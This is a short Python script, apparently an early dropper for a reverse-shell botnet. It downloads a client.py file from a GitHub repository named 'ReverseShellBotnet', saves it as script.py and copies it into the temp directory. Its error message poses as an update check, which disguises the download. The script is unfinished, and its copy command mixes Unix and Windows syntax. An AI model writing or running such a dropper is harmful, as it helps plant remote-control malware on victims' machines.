import requests
import os


# Get python script and write to file
with open("script.py", "w") as dr:
    try:
        dat = requests.get("https://raw.githubusercontent.com/4b3j/ReverseShellBotnet/main/client.py").text
        dr.writelines(f"{dat}")
    except ConnectionError:
        print("Unable to check for any updates")
    dr.close()

# Will continue on working later on 
os.system("cp script.py %temp%")
